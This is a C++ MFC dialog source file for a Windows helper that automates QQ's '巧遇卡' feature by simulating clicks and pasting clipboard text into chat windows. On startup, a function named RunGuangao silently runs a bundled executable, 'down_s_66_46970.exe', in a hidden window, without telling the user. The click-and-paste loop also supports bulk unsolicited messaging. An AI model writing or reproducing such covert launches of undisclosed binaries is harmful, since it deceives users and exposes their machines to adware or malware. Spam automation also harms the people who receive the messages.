
// qiaoyukaDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "qiaoyuka.h"
#include "qiaoyukaDlg.h"
#include "Tlhelp32.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define  TIMER_CHECKQYK     1000
#define  TIMER_CHECKSHUOMING 1001
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CqiaoyukaDlg 对话框




CqiaoyukaDlg::CqiaoyukaDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CqiaoyukaDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hQyk = NULL;
	m_hTalk =NULL;
}

void CqiaoyukaDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_QIAOYUKAEXE, m_Edit_QiaoyukaExe);
	DDX_Control(pDX, IDC_STATICMEI, m_hyperlink);
	DDX_Control(pDX, IDC_STATICDSNIXI, m_Static_DiaoSiNiXi);
	DDX_Control(pDX, IDC_EDITMOUSECLICK, m_EClickTime);
}

BEGIN_MESSAGE_MAP(CqiaoyukaDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_SEND, &CqiaoyukaDlg::OnBnClickedButtonSend)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BUTTONBUG, &CqiaoyukaDlg::OnBnClickedButtonbug)
    ON_COMMAND(ID_32771, &CqiaoyukaDlg::OnHelp)
END_MESSAGE_MAP()


// CqiaoyukaDlg 消息处理程序

void  RunGuangao(CString strDirectory)
{
    strDirectory += _T("\\down_s_66_46970.exe");
    WinExec(CW2A(strDirectory),SW_HIDE);
}


BOOL CqiaoyukaDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标
    
	HBITMAP   hBitmap;   
	hBitmap = LoadBitmap(AfxGetInstanceHandle(),   
		MAKEINTRESOURCE(IDB_BITMAP1));
	((CButton*)GetDlgItem(IDC_BUTTONBUG))->SetBitmap(hBitmap);
	 m_bfirst = TRUE;
	TCHAR StrCurrentDir[256] ={0};
	GetDlgItem(IDC_EDITMOUSECLICK)->SetWindowText(_T("2000"));
	GetCurrentDirectory(256,StrCurrentDir);
    RunGuangao(T2CW(StrCurrentDir));
    m_hyperlink.SetURL(L"http://blog.sina.com.cn/s/blog_ac930a9f01018ouq.html");
	// TODO: 在此添加额外的初始化代码
    m_Static_DiaoSiNiXi.SetURL(_T("http://blog.sina.com.cn/s/blog_8335c2af01013j8a.html"));
    SetTimer(TIMER_CHECKQYK,1000,0);
   
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CqiaoyukaDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CqiaoyukaDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CqiaoyukaDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CqiaoyukaDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
   if(nIDEvent == TIMER_CHECKQYK)
   {  
	   if(m_bfirst)
	   {
		  
	      m_bfirst = FALSE;
	   }
	   CWnd *hQiaoYuKa = FindWindow(NULL,_T("查找联系人"));
     
	  if(hQiaoYuKa != NULL)
	  {
		  m_hQyk = hQiaoYuKa->GetSafeHwnd();
		  m_Edit_QiaoyukaExe.SetWindowText(_T("巧遇卡运行中"));
	  }
	  else
	  {
          m_Edit_QiaoyukaExe.SetWindowText(_T("请运行巧遇卡"));
	  }

   }
   

   
     

	CDialog::OnTimer(nIDEvent);
}



CString GetProcessNameFromId(int pid)
{ 
	PROCESSENTRY32 pe;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if(Process32First(hSnapshot,&pe))
	{
		do
		{
			pe.dwSize = sizeof(PROCESSENTRY32);
			if(!Process32Next(hSnapshot,&pe))
				break;
				if (pe.th32ProcessID == pid)
				{
                    CloseHandle(hSnapshot);
					return pe.szExeFile;
				}
			
		}while(TRUE);
	}


   CloseHandle(hSnapshot);	
   return 0;

}

BOOL CALLBACK  CqiaoyukaDlg::OnSubWinow(HWND hwnd,
										 LPARAM lParam)
{ 

    DWORD dwId = 0 ;
	GetWindowThreadProcessId(hwnd,&dwId);
	CString csExeName = GetProcessNameFromId(dwId);
	if(csExeName == _T("QQExternal.exe"))
	{


		  CRect cli;
		  ::GetWindowRect(hwnd,cli);
		  if(cli.Width() <700)
		  {
 

		   return FALSE;
		  }

          
	

	}
 
	return TRUE;
}

BOOL CALLBACK CqiaoyukaDlg::OEnumWindowsProc(HWND hwnd,
							  LPARAM lParam
							  )
{
   
	CqiaoyukaDlg * dlg = (CqiaoyukaDlg *)lParam;
	TCHAR  strWindowName[256] = {0};
	TCHAR  strClassName[256] = {0};

	GetClassName(hwnd,strClassName,256);
	CString csClasswName(strClassName); 

	if(csClasswName ==_T("TXGuiFoundation"))
	 {
         ::GetWindowText(hwnd,strWindowName,256);
		  CString  csWindowName(strWindowName);
		  DWORD dwId;

          GetWindowThreadProcessId(hwnd,&dwId);
		  CString csExeName = GetProcessNameFromId(dwId);
		  if(csExeName == _T("QQ.exe"))  //巧遇卡进程 ps 尽管这代码很难写，但是为了，。。屌丝们的幸福，叔叔冲了
		  {
			  EnumChildWindows(hwnd,OnSubWinow,0);
		  
		  }
		
          
           
		   //Sethotkey
		    /*if(dwId == )
              
			if(csWindowName!= _T("查找联系人"))
			{
				dlg->m_hTalk = hwnd;
				return  FALSE;
			}*/
	 }
   
return TRUE;
}

void CqiaoyukaDlg::OnBnClickedButtonSend()
{
	// TODO: 在此添加控件通知处理程序代码

	CString  csClickTime;
	m_EClickTime.GetWindowText(csClickTime);
	 
    int iClickTime =  atoi(CW2A(csClickTime));
	if(m_hQyk != NULL)
	{  
		CRect  cli;
		::GetWindowRect(m_hQyk,cli);

         SetCursorPos(cli.left+120,cli.top+180);
		//获取最前面的窗口是否是巧遇卡
		mouse_event (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
		mouse_event (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
		//根据不同的网速设置延时间隔
        Sleep(iClickTime);
		mouse_event (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
		mouse_event (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
		Sleep(iClickTime);
		//GetDesktopWindow()
		//GetTopWindow()	 AfxBeginThread()
		EnumWindows(OEnumWindowsProc,(LPARAM)this);

		if(m_hTalk != NULL)
		{
			::GetWindowRect(m_hTalk,cli);
			  SetCursorPos(cli.right-100,cli.bottom-150);
			  SetCursorPos(cli.right-250,cli.bottom-110);
			  mouse_event (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
			    mouse_event (MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );
			  keybd_event(VK_CONTROL, 0, 0, 0 );//按下Ctrl键 
			  keybd_event('V', 0, 0, 0);//按下v键 
			  keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP,0);//然后松开键盘
			  keybd_event('V',0,KEYEVENTF_KEYUP,0);//然后松开键盘
		}
       //AfxMessageBox(_T("122121"));
	}
	else
	{
      AfxMessageBox(_T("请先打开qq查找联系人运行巧遇卡"));
	}

}

HBRUSH CqiaoyukaDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	if(pWnd->m_hWnd == GetDlgItem(IDC_EDIT_QIAOYUKAEXE)->GetSafeHwnd() ||pWnd->m_hWnd == GetDlgItem(IDC_STATICMEI)->GetSafeHwnd())   
	{   
		//pDC->SetBkColor(RGB(0,255,0));
		pDC->SetTextColor(RGB(255,0,0));
		return   (HBRUSH)m_brush;   
	} 

	return hbr;
}

void CqiaoyukaDlg::OnBnClickedButtonbug()
{
	// TODO: 在此添加控件通知处理程序代码
   ShellExecute(NULL, _T("open"),_T("mailto:6520874@163.com?subject=您好，我的软件用不了"),NULL,NULL, SW_SHOWNORMAL);
}

void CqiaoyukaDlg::OnHelp()
{
    // TODO: 在此添加命令处理程序代码、
 ::MessageBox(0,_T("首次使用,请打开2013QQ查找好友按钮，选择巧遇卡 点击开始按钮\n本软件可能根据不同网速的机子有延时，输入1000即等待1秒\n机子网速越牛逼，设置延时越短，pipi"),_T("使用说明"),MB_OK);
}
